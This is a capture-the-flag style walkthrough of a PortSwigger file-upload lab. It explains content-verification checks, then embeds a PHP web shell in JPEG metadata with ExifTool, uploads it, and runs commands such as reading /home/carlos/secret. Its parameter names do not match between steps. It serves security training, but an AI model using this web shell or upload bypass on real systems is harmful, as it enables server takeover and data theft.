## Welcome, my friend. Today we will start the [6. File Upload lab](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload) in ```portswigger```

# Explain this Scenario:

## Inadequate verification of file contents

#### Instead of implicitly trusting the type of content specified in the request, more secure servers attempt to verify that the contents of the file actually match what is expected.

### 1. Check the file's intrinsic properties

#### In the case of image upload functionality, the server may attempt to verify some intrinsic properties of the image, such as its dimensions. If you try to load a PHP script, for example, it will not contain dimensions, so the server can conclude that it cannot be an image and refuse to load accordingly.

### Realistic scenario:

#### Imagine you are trying to upload a PHP file as an image. The server checks the dimensions, and because the PHP file does not contain dimensions, the server refuses to upload.



#### 2. Use a file signature


#### Certain types of files always contain a specific sequence of bytes in the file header or footer. These sequences can be used as a "fingerprint" or "signature" to determine whether the contents match the expected type. For example, ```JPEG``` files always start with bytes ```FF D8 FF```.

#### Realistic scenario:

#### If you upload a file that claims to be a JPEG image, the server can verify that the file begins with FF D8 FF. If this signature is not found, the file is rejected.


### 3. Verification using special tools

#### Although this method is more robust in verifying the file type, it is not without drawbacks. Using special tools, such as ExifTool, a multi-purpose JPEG file can easily be created that contains malicious code within its metadata.

### Realistic scenario:

#### Using ```ExifTool```, you can embed malicious PHP code inside metadata in a JPEG file. The file is uploaded as an image, but malicious code can be extracted and executed.

-------

### Practical example:

#### If the server verifies that the uploaded file is a JPEG image based on the signature, you can create a file that has the correct JPEG header (eg FF D8 FF) but also has a PHP script embedded in the metadata.

#### Using ExifTool:

#### Create a malicious PHP script, such as:

```
<?php system($_GET['cmd']); ?>
```

### Use ExifTool to add this script as metadata to a JPEG image:

```
exiftool -Comment='<?php system($_GET["cmd"]); ?>' name_your_image.jpg -o exploit.php
```

### Upload the exploit.jpg file to the server.

##### This way, the file can look like a normal image, but malicious code can be extracted and executed when targeting metadata.

# Let's play this lab:

#### Let's log in to your own account using the following credentials: ```wiener:peter```

![image](https://github.com/user-attachments/assets/1b7229a1-3813-48f9-b6f0-0dcc0d603e78)


#### Let's create a php malicious payload in file ```tor.php```:

### within tor.php:

```
<?php
    echo system($_GET["tor"]);
?>
```

![image](https://github.com/user-attachments/assets/295203de-7776-489e-b02f-df7db4e826ee)

### Now, Let's upload this malicious payload to server.

### Ok ,We will using ```exiftool``` to inject our payload in image.

```
exiftool -Comment='<?php system($_GET["cmd"]); ?>' hack.jpg -o exploit.php
```

Let's upload this exploit.php

![image](https://github.com/user-attachments/assets/99381916-49e0-4a84-8af6-77962fd2f26a)



#### WOW! The file has been uploaded successfully.

### From Task 1, we explore that our file is within this path ```/files/avatars/file_name?parameter=command``` like this:

```
/files/avatars/exploit.php?tor=id
```

![image](https://github.com/user-attachments/assets/1aa5f714-fc44-450a-b868-9619f0ab429a)



#### Ok this task requrie reach to /home/carlos/secret file.

```
/files/avatars/exploit?tor=cat /home/carlos/secret
```

### Let's Submit this secret using the button provided in the lab banner.

## Then ...
